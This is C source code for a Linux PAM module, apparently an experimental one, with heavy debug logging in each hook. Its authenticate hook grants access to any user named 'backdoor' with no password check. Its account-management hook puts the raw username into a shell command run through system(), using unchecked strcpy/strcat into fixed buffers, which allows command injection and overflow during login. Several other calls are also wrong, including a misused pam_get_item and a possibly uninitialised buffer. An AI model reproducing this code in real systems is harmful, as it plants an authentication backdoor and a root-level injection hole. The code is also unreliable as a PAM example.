#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* expected hook */
PAM_EXTERN int
pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	//fprintf(stdout,"fprintf - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
	syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);


	syslog(LOG_ERR, "%s - %s(%d) argc = %d \n", __FILE__,__func__,__LINE__,argc);
	for (int i =0;i<argc;i++)
		syslog(LOG_ERR, "%s - %s(%d) argv[%d] = %s \n", __FILE__,__func__,__LINE__,argc,argv[i]);
	const char *user = NULL;
	int retval = pam_get_item(pamh, PAM_USER, user);
	syslog(LOG_ERR, "%s - %s(%d) user = %s\n", __FILE__,__func__,__LINE__,user);

	if (flags & PAM_SILENT)
	{
		printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
		syslog(LOG_ERR, "%s - %s(%d) PAM_SILENT\n", __FILE__,__func__,__LINE__);
	}
	if (flags & PAM_ESTABLISH_CRED )
	{
		printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
		syslog(LOG_ERR, "%s - %s(%d) PAM_ESTABLISH_CRED\n", __FILE__,__func__,__LINE__);
	}
	if (flags & PAM_DELETE_CRED )
	{
		printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
		syslog(LOG_ERR, "%s - %s(%d) PAM_DELETE_CRED\n", __FILE__,__func__,__LINE__);
	}
	if (flags & PAM_REINITIALIZE_CRED )
	{
		printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
		syslog(LOG_ERR, "%s - %s(%d) PAM_REINITIALIZE_CRED\n", __FILE__,__func__,__LINE__);
	}
	if (flags & PAM_REFRESH_CRED )
	{
		printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
		syslog(LOG_ERR, "%s - %s(%d) PAM_REFRESH_CRED\n", __FILE__,__func__,__LINE__);
	}

	/* Environment variable name */
	const char *env_var_name = "USER_FULL_NAME";

	/* User full name */
	const char *name = "John Smith";

	/* String in which we write the assignment expression */
	char env_assignment[100];

	/* If application asks for establishing credentials */
	if (flags & PAM_ESTABLISH_CRED)
	{
		printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
		syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
		sprintf(env_assignment, "%s=%s", env_var_name, name);
	}
		/* We create the assignment USER_FULL_NAME=John Smith */

	/* If application asks to delete credentials */
	else if (flags & PAM_DELETE_CRED)
	{
		printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
		syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
		sprintf(env_assignment, "%s", env_var_name);
	}
		/* We create the assignment USER_FULL_NAME, withouth equal,
		 * which deletes the environment variable */


	/* In this case credentials do not have an expiry date,
	 * so we won't handle PAM_REINITIALIZE_CRED */

	pam_putenv(pamh, env_assignment);
	return PAM_SUCCESS;

}

PAM_EXTERN int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	fprintf(stdout,"fprintf - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
	syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);




	syslog(LOG_ERR, "%s - %s(%d) argc = %d \n", __FILE__,__func__,__LINE__,argc);
	for (int i =0;i<argc;i++)
		syslog(LOG_ERR, "%s - %s(%d) argv[%d] = %s \n", __FILE__,__func__,__LINE__,argc,argv[i]);



	const char *user = NULL;
	int retval = pam_get_item(pamh, PAM_USER, user);
	fprintf(stdout,"fprintf - %s - %s(%d) user = %s\n", __FILE__,__func__,__LINE__, user);
	printf("%s - %s(%d) user = %s\n", __FILE__,__func__,__LINE__, user);
	syslog(LOG_ERR, "%s - %s(%d) user = %s\n", __FILE__,__func__,__LINE__,user);


	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");
	fprintf(stdout,"fprintf - %s - %s(%d) pUsername = %s\n", __FILE__,__func__,__LINE__, pUsername);
	printf("%s - %s(%d) pUsername = %s\n", __FILE__,__func__,__LINE__, pUsername);
	syslog(LOG_ERR, "%s - %s(%d) pUsername = %s\n", __FILE__,__func__,__LINE__,pUsername);


	//echo "4:roy:" | socat - unix-connect:/opt/socket/console.socket
	char cmd_achar[128];
	char user_achar[128];
	memset(cmd_achar, 0, sizeof(char[128]));
	memset(user_achar, 0, sizeof(char[128]));
	strcpy(user_achar, pUsername);
	strcpy(cmd_achar, "echo \"4:");
	//strcat(cmd_achar, pUsername);
	//char* temp_ptr = strstr(user_achar, "\\");
	char* temp_ptr = user_achar;
	//temp_ptr++;
	strcat(cmd_achar, temp_ptr);
	strcat(cmd_achar, ":\" | socat -t10 - unix-connect:/opt/socket/console.socket");
	syslog(LOG_ERR, "%s - %s(%d) cmd_achar = %s\n", __FILE__,__func__,__LINE__, cmd_achar);
	system(cmd_achar);

	return PAM_SUCCESS;
	//return PAM_AUTHTOK_ERR;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int
pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;

	const char* pUsername;
	fprintf(stdout,"fprintf - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
	syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	fprintf(stdout,"fprintf - %s - %s(%d) : %s \n", __FILE__,__func__,__LINE__,pUsername);
	printf("%s - %s(%d) : %s \n", __FILE__,__func__,__LINE__,pUsername);
	syslog(LOG_ERR, "syslog - %s - %s(%d) : %s\n", __FILE__,__func__,__LINE__,pUsername);


	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}
	return PAM_SUCCESS;
	//return PAM_AUTHTOK_ERR;
}

PAM_EXTERN int
pam_sm_chauthtok(pam_handle_t *pamh,
	int flags,
	int argc,
	const char **argv)
{

	syslog(LOG_ERR, "%s - %s(%d) argc = %d \n", __FILE__,__func__,__LINE__,argc);
	for (int i =0;i<argc;i++)
		syslog(LOG_ERR, "%s - %s(%d) argv[%d] = %s \n", __FILE__,__func__,__LINE__,argc,argv[i]);





	fprintf(stdout,"fprintf - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
	syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_open_session(pam_handle_t *pamh, int flags, int argc,
			const char **argv)
{
	fprintf(stdout,"fprintf - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
	syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_close_session(pam_handle_t *pamh,
				    int flags, int argc, const char **argv)
{
	fprintf(stdout,"fprintf - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
	printf("%s - %s(%d)\n", __FILE__,__func__,__LINE__);
	syslog(LOG_ERR, "syslog - %s - %s(%d)\n", __FILE__,__func__,__LINE__);
    return PAM_SUCCESS;
}
